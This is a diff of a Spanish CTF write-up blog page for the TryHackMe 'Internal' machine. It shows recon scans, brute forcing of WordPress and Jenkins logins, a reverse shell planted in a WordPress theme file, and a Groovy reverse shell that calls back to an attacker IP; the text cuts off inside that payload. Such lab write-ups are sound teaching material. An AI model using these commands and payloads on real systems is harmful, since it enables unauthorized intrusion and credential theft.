@@ -1,16 +1,132 @@
-<!doctype html><html lang=es><head><title>Internal - Write Up - Español ::
-Lanfran02 - Blog — Hackeando tu forma de aprender.</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Link Nivel Creador     Aquí Difícil TheMayor    Reconocimiento No empezaremos haciendo nada nuevo, simplemente un nmap a la máquina.
-╰─ lanfran@parrot ❯ map 10.10.170.6 ─╯ [sudo] password for lanfran: Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-09 10:53 CEST Nmap scan report for 10.10.170.6 Host is up (0.082s latency). Not shown: 990 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7."><meta name=keywords content="CTF,Writeup,Hacking"><meta name=robots content="noodp"><link rel=canonical href=/es/posts/internal/><link rel=stylesheet href=/assets/style.css><link rel=stylesheet href=/style.css><link rel=apple-touch-icon-precomposed sizes=144x144 href=/img/apple-touch-icon-144-precomposed.png><link rel="shortcut icon" href=/img/favicon.png><link href=/assets/fonts/Inter-Italic.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-Regular.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-Medium.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-MediumItalic.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-Bold.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-BoldItalic.woff2 rel=preload type=font/woff2 as=font crossorigin><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/es/posts/internal/cover.jpeg"><meta name=twitter:title content="Internal - Write Up - Español"><meta name=twitter:description content="Maquina de nivel difícil en TryHackMe."><meta property="og:title" content="Internal - Write Up - Español"><meta property="og:description" content="Maquina de nivel difícil en TryHackMe."><meta property="og:type" content="article"><meta property="og:url" content="/es/posts/internal/"><meta property="og:image" content="/es/posts/internal/cover.jpeg"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-07-09T10:52:31+02:00"><meta property="article:modified_time" content="2021-07-09T10:52:31+02:00"><meta property="og:site_name" content="Lanfran02 - Blog"><script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-3T7DYCWC0W',{anonymize_ip:!1})}</script><script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','G-3T7DYCWC0W','auto'),ga('send','pageview'))</script><script async src=https://www.google-analytics.com/analytics.js></script></head><body class=dark-theme><div class=container><header class=header><span class=header__inner><a href=/es/ class=logo style=text-decoration:none><span class=logo__mark><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg></span><span class=logo__text>Lanfran02</span>
-<span class=logo__cursor></span></a><span class=header__right><nav class=menu><ul class="menu__inner menu__inner--desktop"><li><a href=/es/about>Acerca de mí</a></li><li><a href=/>English</a></li><ul class=menu__sub-inner><li class=menu__sub-inner-more-trigger>Write Ups
-<span class=menu__sub-inner-more-trigger-icon><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg></span></li><ul class="menu__sub-inner-more hidden"><li><a href=/es/tags/hackthebox/>HTB</a></li><li><a href=/es/tags/tryhackme/>THM</a></li></ul></ul></ul><ul class="menu__inner menu__inner--mobile"><li><a href=/es/about>Acerca de mí</a></li><li><a href=/>English</a></li><li><a href=/es/tags/hackthebox/>HTB</a></li><li><a href=/es/tags/tryhackme/>THM</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></span><span class=theme-toggle><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg></span></span></span></header><div class=content><div class=post><h1 class=post-title>Internal - Write Up - Español</h1><div class=post-meta><span class=post-date>2021-07-09</span>
+<!doctype html><html lang=es>
+<head>
+<title>
+Internal - Write Up - Español ::
+Lanfran02 - Blog — Hackeando tu forma de aprender.
+</title>
+<meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=description content="Link Nivel Creador     Aquí Difícil TheMayor    Reconocimiento No empezaremos haciendo nada nuevo, simplemente un nmap a la máquina.
+╰─ lanfran@parrot ❯ map 10.10.170.6 ─╯ [sudo] password for lanfran: Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-09 10:53 CEST Nmap scan report for 10.10.170.6 Host is up (0.082s latency). Not shown: 990 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.">
+<meta name=keywords content="CTF,Writeup,Hacking">
+<meta name=robots content="noodp">
+<link rel=canonical href=/es/posts/internal/>
+<link rel=stylesheet href=/assets/style.css>
+<link rel=stylesheet href=/style.css>
+<link rel=apple-touch-icon-precomposed sizes=144x144 href=/img/apple-touch-icon-144-precomposed.png>
+<link rel="shortcut icon" href=/img/favicon.png>
+<link href=/assets/fonts/Inter-Italic.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=/assets/fonts/Inter-Regular.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=/assets/fonts/Inter-Medium.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=/assets/fonts/Inter-MediumItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=/assets/fonts/Inter-Bold.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=/assets/fonts/Inter-BoldItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<meta name=twitter:card content="summary_large_image">
+<meta name=twitter:image content="/es/posts/internal/cover.jpeg">
+<meta name=twitter:title content="Internal - Write Up - Español">
+<meta name=twitter:description content="Maquina de nivel difícil en TryHackMe.">
+<meta property="og:title" content="Internal - Write Up - Español">
+<meta property="og:description" content="Maquina de nivel difícil en TryHackMe.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="/es/posts/internal/"><meta property="og:image" content="/es/posts/internal/cover.jpeg"><meta property="article:section" content="posts">
+<meta property="article:published_time" content="2021-07-09T10:52:31+02:00">
+<meta property="article:modified_time" content="2021-07-09T10:52:31+02:00"><meta property="og:site_name" content="Lanfran02 - Blog">
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-3T7DYCWC0W',{anonymize_ip:!1})}</script>
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','G-3T7DYCWC0W','auto'),ga('send','pageview'))</script>
+<script async src=https://www.google-analytics.com/analytics.js></script>
+</head>
+<body class=dark-theme>
+<div class=container>
+<header class=header>
+<span class=header__inner>
+<a href=/es/ class=logo style=text-decoration:none>
+<span class=logo__mark><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
+</span>
+<span class=logo__text>Lanfran02</span>
+<span class=logo__cursor></span>
+</a>
+<span class=header__right>
+<nav class=menu>
+<ul class="menu__inner menu__inner--desktop">
+<li><a href=/es/about>Acerca de mí</a></li>
+<li><a href=/>English</a></li>
+<ul class=menu__sub-inner>
+<li class=menu__sub-inner-more-trigger>
+Write Ups
+<span class=menu__sub-inner-more-trigger-icon><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
+</span>
+</li>
+<ul class="menu__sub-inner-more hidden">
+<li><a href=/es/tags/hackthebox/>HTB</a></li>
+<li><a href=/es/tags/tryhackme/>THM</a></li>
+</ul>
+</ul>
+</ul>
+<ul class="menu__inner menu__inner--mobile">
+<li><a href=/es/about>Acerca de mí</a></li>
+<li><a href=/>English</a></li>
+<li><a href=/es/tags/hackthebox/>HTB</a></li>
+<li><a href=/es/tags/tryhackme/>THM</a></li>
+</ul>
+</nav>
+<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
+</span>
+<span class=theme-toggle><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg>
+</span>
+</span>
+</span>
+</header>
+<div class=content>
+<div class=post>
+<h1 class=post-title>Internal - Write Up - Español</h1>
+<div class=post-meta>
+<span class=post-date>
+2021-07-09
+</span>
 <span class=post-author>— Escrito por Lanfran02</span>
-<span class=post-read-time>— 8 mins lectura</span></div><span class=post-tags><a href=/tags/gobuster/>#gobuster</a>&nbsp;
+<span class=post-read-time>— 8 mins lectura</span>
+</div>
+<span class=post-tags>
+<a href=/tags/gobuster/>#gobuster</a>&nbsp;
 <a href=/tags/wpscan/>#WPScan</a>&nbsp;
 <a href=/tags/nc/>#nc</a>&nbsp;
 <a href=/tags/jenkins/>#jenkins</a>&nbsp;
 <a href=/tags/docker/>#docker</a>&nbsp;
 <a href=/tags/hydra/>#hydra</a>&nbsp;
-<a href=/tags/tryhackme/>#TryHackMe</a>&nbsp;</span><figure class=post-cover><img src=/es/posts/internal/cover.jpeg alt="Internal - Write Up - Español"></figure><div class=post-content><h2>Table of Contents</h2><aside class=table-of-contents><nav id=TableOfContents><ul><li><a href=#reconocimiento>Reconocimiento</a></li><li><a href=#acceso-inicial---usuario>Acceso inicial - Usuario</a></li><li><a href=#root>Root</a></li></ul></nav></aside><table><thead><tr><th>Link</th><th>Nivel</th><th>Creador</th></tr></thead><tbody><tr><td><a href=https://tryhackme.com/room/internal>Aquí</a></td><td>Difícil</td><td><a href=https://tryhackme.com/p/TheMayor>TheMayor</a></td></tr></tbody></table><h2 id=reconocimiento>Reconocimiento</h2><p>No empezaremos haciendo nada nuevo, simplemente un <code>nmap</code> a la máquina.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ map 10.10.170.6                                                                                                ─╯
+<a href=/tags/tryhackme/>#TryHackMe</a>&nbsp;
+</span>
+<figure class=post-cover>
+<img src=/es/posts/internal/cover.jpeg alt="Internal - Write Up - Español">
+</figure>
+<div class=post-content>
+<h2>Table of Contents</h2>
+<aside class=table-of-contents><nav id=TableOfContents>
+<ul>
+<li><a href=#reconocimiento>Reconocimiento</a></li>
+<li><a href=#acceso-inicial---usuario>Acceso inicial - Usuario</a></li>
+<li><a href=#root>Root</a></li>
+</ul>
+</nav></aside>
+<table>
+<thead>
+<tr>
+<th>Link</th>
+<th>Nivel</th>
+<th>Creador</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href=https://tryhackme.com/room/internal>Aquí</a></td>
+<td>Difícil</td>
+<td><a href=https://tryhackme.com/p/TheMayor>TheMayor</a></td>
+</tr>
+</tbody>
+</table>
+<h2 id=reconocimiento>Reconocimiento</h2>
+<p>No empezaremos haciendo nada nuevo, simplemente un <code>nmap</code> a la máquina.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ map 10.10.170.6                                                                                                ─╯
 <span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> lanfran: 
 Starting Nmap 7.91 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2021-07-09 10:53 CEST
 Nmap scan report <span style=color:#66d9ef>for</span> 10.10.170.6
@@ -37,7 +153,8 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 34.25 seconds
-</code></pre></div><p>Veamos si podemos encontrar alguna carpeta o endpoint oculto con <code>gobuster</code>.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ scan 10.10.170.6                                                                                               ─╯
+</code></pre></div><p>Veamos si podemos encontrar alguna carpeta o endpoint oculto con <code>gobuster</code>.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ scan 10.10.170.6                                                                                               ─╯
 <span style=color:#f92672>===============================================================</span>
 Gobuster v3.0.1
 by OJ Reeves <span style=color:#f92672>(</span>@TheColonial<span style=color:#f92672>)</span> &amp; Christian Mehlmauer <span style=color:#f92672>(</span>@_FireFart_<span style=color:#f92672>)</span>
@@ -63,8 +180,12 @@ by OJ Reeves <span style=color:#f92672>(</span>@TheColonial<span style=color:#f9
 <span style=color:#f92672>===============================================================</span>
 2021/07/09 10:53:40 Finished
 <span style=color:#f92672>===============================================================</span>
-</code></pre></div><p>Bien, encontramos dos endpoints interesantes, <code>/blog</code> y <code>/wordpress</code>.</p><p>Navegando hacia ellos, encontramos en el codigo fuente, lo que seria una etiqueta HTML que hace referencia al dominio virtual de la máquina.
-<code>href="http://internal.thm/blog/index.php/feed/" /></code></p><p>Asique agreguemos el nuevo dominio a <code>/etc/hosts</code></p><p>Dado que <code>/blog</code> tiene un <code>wordpress</code> detras, corramos <code>WPScan</code> para obtener más información.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ wpscan -e vp,vt,cb,u --url http://internal.thm/blog/                                                           ─╯
+</code></pre></div><p>Bien, encontramos dos endpoints interesantes, <code>/blog</code> y <code>/wordpress</code>.</p>
+<p>Navegando hacia ellos, encontramos en el codigo fuente, lo que seria una etiqueta HTML que hace referencia al dominio virtual de la máquina.
+<code>href="http://internal.thm/blog/index.php/feed/" /></code></p>
+<p>Asique agreguemos el nuevo dominio a <code>/etc/hosts</code></p>
+<p>Dado que <code>/blog</code> tiene un <code>wordpress</code> detras, corramos <code>WPScan</code> para obtener más información.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ wpscan -e vp,vt,cb,u --url http://internal.thm/blog/                                                           ─╯
 _______________________________________________________________
          __          _______   _____
          <span style=color:#ae81ff>\ \ </span>       / /  __ <span style=color:#ae81ff>\ </span>/ ____|
@@ -100,7 +221,9 @@ _______________________________________________________________
 <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Data Received: 538.97 KB
 <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Memory used: 219.34 MB
 <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Elapsed time: 00:00:18
-</code></pre></div><p>Nos devuelve información interesante, encontró un usuario: <code>admin</code>.</p><p>Veamos si podemos hacerle fuerza bruta al login de wordpress con ese usuario&mldr;</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ wpscan --url http://internal.thm/blog -U admin -P /usr/share/wordlists/rockyou.txt                             ─╯
+</code></pre></div><p>Nos devuelve información interesante, encontró un usuario: <code>admin</code>.</p>
+<p>Veamos si podemos hacerle fuerza bruta al login de wordpress con ese usuario&mldr;</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ wpscan --url http://internal.thm/blog -U admin -P /usr/share/wordlists/rockyou.txt                             ─╯
 _______________________________________________________________
          __          _______   _____
          <span style=color:#ae81ff>\ \ </span>       / /  __ <span style=color:#ae81ff>\ </span>/ ____|
@@ -133,7 +256,12 @@ Trying admin / bratz1 Time: 00:02:40 &lt;                                       
 <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Data Received: 2.31 MB
 <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Memory used: 237.906 MB
 <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Elapsed time: 00:02:51
-</code></pre></div><p>¡Genial!</p><p>Ahora tenemos el acceso al panel de administrador de wordpress!</p><h2 id=acceso-inicial---usuario>Acceso inicial - Usuario</h2><p>Logeandonos al WP-Admin, podemos obtener una shell reversa usando el template de 404.php del tema twentyseventeen.</p><p>Y luego navegamos hacía <code>http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php</code> para obtener la conexión!</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ nc -nlvp <span style=color:#ae81ff>1337</span>                                                                                                                                  ─╯
+</code></pre></div><p>¡Genial!</p>
+<p>Ahora tenemos el acceso al panel de administrador de wordpress!</p>
+<h2 id=acceso-inicial---usuario>Acceso inicial - Usuario</h2>
+<p>Logeandonos al WP-Admin, podemos obtener una shell reversa usando el template de 404.php del tema twentyseventeen.</p>
+<p>Y luego navegamos hacía <code>http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php</code> para obtener la conexión!</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ nc -nlvp <span style=color:#ae81ff>1337</span>                                                                                                                                  ─╯
 listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>1337</span> ...
 connect to <span style=color:#f92672>[</span>10.9.1.222<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.10.170.6<span style=color:#f92672>]</span> <span style=color:#ae81ff>48948</span>
 bash: cannot set terminal process group <span style=color:#f92672>(</span>1075<span style=color:#f92672>)</span>: Inappropriate ioctl <span style=color:#66d9ef>for</span> device
@@ -142,7 +270,9 @@ www-data@internal:/var/www/html/wordpress/wp-content/themes/twentyseventeen$ id
 uid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span>
 www-data@internal:/var/www/html/wordpress/wp-content/themes/twentyseventeen$ whoami
 www-data
-</code></pre></div><p>Logramos un gran avance, ya tenemos un pie en la máquina.</p><p>Buscando por los archivos de la máquina, encontramos un archivo que contiene el usuario y la contraseña de aubreanna!</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>www-data@internal:/opt$ ls -la
+</code></pre></div><p>Logramos un gran avance, ya tenemos un pie en la máquina.</p>
+<p>Buscando por los archivos de la máquina, encontramos un archivo que contiene el usuario y la contraseña de aubreanna!</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>www-data@internal:/opt$ ls -la
 total <span style=color:#ae81ff>16</span>
 drwxr-xr-x  <span style=color:#ae81ff>3</span> root root <span style=color:#ae81ff>4096</span> Aug  <span style=color:#ae81ff>3</span>  <span style=color:#ae81ff>2020</span> .
 drwxr-xr-x <span style=color:#ae81ff>24</span> root root <span style=color:#ae81ff>4096</span> Aug  <span style=color:#ae81ff>3</span>  <span style=color:#ae81ff>2020</span> ..
@@ -159,10 +289,15 @@ Password: <span style=color:#f92672>[</span>REDACTADO<span style=color:#f92672>]
 
 aubreanna@internal:/opt$ cat /home/aubreanna/user.txt 
 <span style=color:#f92672>[</span>REDACTADO<span style=color:#f92672>]</span>
-</code></pre></div><p>Podemos loguearnos con <code>su</code> y leer la flag de usuario.</p><h2 id=root>Root</h2><p>En el directorio <code>home</code> de <code>aubreanna</code> hay una nota, leamosla</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>aubreanna@internal:~$ cat jenkins.txt 
+</code></pre></div><p>Podemos loguearnos con <code>su</code> y leer la flag de usuario.</p>
+<h2 id=root>Root</h2>
+<p>En el directorio <code>home</code> de <code>aubreanna</code> hay una nota, leamosla</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>aubreanna@internal:~$ cat jenkins.txt 
 Internal Jenkins service is running on 172.17.0.2:8080
 aubreanna@internal:~$
-</code></pre></div><p>Mmmm, hay un servicio Jenkins corriendo&mldr;</p><p>Ya que tenemos las credenciales de este usuario, hagamosle un forward a ese puerto para poder acceder desde nuestra PC.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ ssh -L 8080:172.17.0.2:8080 aubreanna@internal.thm                                                             ─╯
+</code></pre></div><p>Mmmm, hay un servicio Jenkins corriendo&mldr;</p>
+<p>Ya que tenemos las credenciales de este usuario, hagamosle un forward a ese puerto para poder acceder desde nuestra PC.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ ssh -L 8080:172.17.0.2:8080 aubreanna@internal.thm                                                             ─╯
 The authenticity of host <span style=color:#e6db74>&#39;internal.thm (10.10.170.6)&#39;</span> can<span style=color:#e6db74>&#39;t be established.
 </span><span style=color:#e6db74>ECDSA key fingerprint is SHA256:fJ/BlTrDF8wS8/eqyoej1aq/NmvQh79ABdkpiiN5tqE.
 </span><span style=color:#e6db74>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
@@ -194,7 +329,8 @@ Welcome to Ubuntu 18.04.4 LTS <span style=color:#f92672>(</span>GNU/Linux 4.15.0
 
 Last login: Mon Aug  <span style=color:#ae81ff>3</span> 19:56:19 <span style=color:#ae81ff>2020</span> from 10.6.2.56
 aubreanna@internal:~$
-</code></pre></div><p>Mmmmm, si ahora nos dirigimos a <code>127.0.0.1:8080</code> veremos la página de jenkins solicitando credenciales, usemos <code>hydra</code> para hacerle fuerza bruta.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ hydra 127.0.0.1 -s <span style=color:#ae81ff>8080</span> -f http-form-post <span style=color:#e6db74>&#34;/j_acegi_security_check:j_username=^USER^&amp;j_password=^PASS^&amp;from=%2F&amp;Submit=Sign+in&amp;Login=Login:Invalid username or password&#34;</span> -l admin -P /usr/share/wordlists/rockyou.txt 
+</code></pre></div><p>Mmmmm, si ahora nos dirigimos a <code>127.0.0.1:8080</code> veremos la página de jenkins solicitando credenciales, usemos <code>hydra</code> para hacerle fuerza bruta.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ hydra 127.0.0.1 -s <span style=color:#ae81ff>8080</span> -f http-form-post <span style=color:#e6db74>&#34;/j_acegi_security_check:j_username=^USER^&amp;j_password=^PASS^&amp;from=%2F&amp;Submit=Sign+in&amp;Login=Login:Invalid username or password&#34;</span> -l admin -P /usr/share/wordlists/rockyou.txt 
 Hydra v9.1 <span style=color:#f92672>(</span>c<span style=color:#f92672>)</span> <span style=color:#ae81ff>2020</span> by van Hauser/THC &amp; David Maciejak - Please <span style=color:#66d9ef>do</span> not use in military or secret service organizations, or <span style=color:#66d9ef>for</span> illegal purposes <span style=color:#f92672>(</span>this is non-binding, these *** ignore laws and ethics anyway<span style=color:#f92672>)</span>.
 
 Hydra <span style=color:#f92672>(</span>https://github.com/vanhauser-thc/thc-hydra<span style=color:#f92672>)</span> starting at 2021-07-09 11:41:41
@@ -206,11 +342,14 @@ Hydra <span style=color:#f92672>(</span>https://github.com/vanhauser-thc/thc-hyd
 <span style=color:#ae81ff>1</span> of <span style=color:#ae81ff>1</span> target successfully completed, <span style=color:#ae81ff>1</span> valid password found
 Hydra <span style=color:#f92672>(</span>https://github.com/vanhauser-thc/thc-hydra<span style=color:#f92672>)</span> finished at 2021-07-09 11:42:07
 
-</code></pre></div><p>Si!! Conseguimos el usuario y la contraseña para poder logearnos.</p><p>En la dirección <code>http://127.0.0.1:8080/script</code> podemos ejecutar un script!</p><p>Yo utilizaré una shell reversa del repositorio <a href=%60https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#groovy%60>PayloadsAllTheThings</a>:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java>String host<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;10.9.1.222&#34;</span><span style=color:#f92672>;</span> <span style=color:#75715e>//Aquí debería ir tu ip
+</code></pre></div><p>Si!! Conseguimos el usuario y la contraseña para poder logearnos.</p>
+<p>En la dirección <code>http://127.0.0.1:8080/script</code> podemos ejecutar un script!</p>
+<p>Yo utilizaré una shell reversa del repositorio <a href=%60https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#groovy%60>PayloadsAllTheThings</a>:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java>String host<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;10.9.1.222&#34;</span><span style=color:#f92672>;</span> <span style=color:#75715e>//Aquí debería ir tu ip
 </span><span style=color:#75715e></span><span style=color:#66d9ef>int</span> port<span style=color:#f92672>=</span>1337<span style=color:#f92672>;</span>
 String cmd<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/bin/bash&#34;</span><span style=color:#f92672>;</span>
 Process p<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> ProcessBuilder<span style=color:#f92672>(</span>cmd<span style=color:#f92672>).</span><span style=color:#a6e22e>redirectErrorStream</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>).</span><span style=color:#a6e22e>start</span><span style=color:#f92672>();</span>Socket s<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> Socket<span style=color:#f92672>(</span>host<span style=color:#f92672>,</span>port<span style=color:#f92672>);</span>InputStream pi<span style=color:#f92672>=</span>p<span style=color:#f92672>.</span><span style=color:#a6e22e>getInputStream</span><span style=color:#f92672>(),</span>pe<span style=color:#f92672>=</span>p<span style=color:#f92672>.</span><span style=color:#a6e22e>getErrorStream</span><span style=color:#f92672>(),</span> si<span style=color:#f92672>=</span>s<span style=color:#f92672>.</span><span style=color:#a6e22e>getInputStream</span><span style=color:#f92672>();</span>OutputStream po<span style=color:#f92672>=</span>p<span style=color:#f92672>.</span><span style=color:#a6e22e>getOutputStream</span><span style=color:#f92672>(),</span>so<span style=color:#f92672>=</span>s<span style=color:#f92672>.</span><span style=color:#a6e22e>getOutputStream</span><span style=color:#f92672>();</span><span style=color:#66d9ef>while</span><span style=color:#f92672>(!</span>s<span style=color:#f92672>.</span><span style=color:#a6e22e>isClosed</span><span style=color:#f92672>()){</span><span style=color:#66d9ef>while</span><span style=color:#f92672>(</span>pi<span style=color:#f92672>.</span><span style=color:#a6e22e>available</span><span style=color:#f92672>()&gt;</span>0<span style=color:#f92672>)</span>so<span style=color:#f92672>.</span><span style=color:#a6e22e>write</span><span style=color:#f92672>(</span>pi<span style=color:#f92672>.</span><span style=color:#a6e22e>read</span><span style=color:#f92672>());</span><span style=color:#66d9ef>while</span><span style=color:#f92672>(</span>pe<span style=color:#f92672>.</span><span style=color:#a6e22e>available</span><span style=color:#f92672>()&gt;</span>0<span style=color:#f92672>)</span>so<span style=color:#f92672>.</span><span style=color:#a6e22e>write</span><span style=color:#f92672>(</span>pe<span 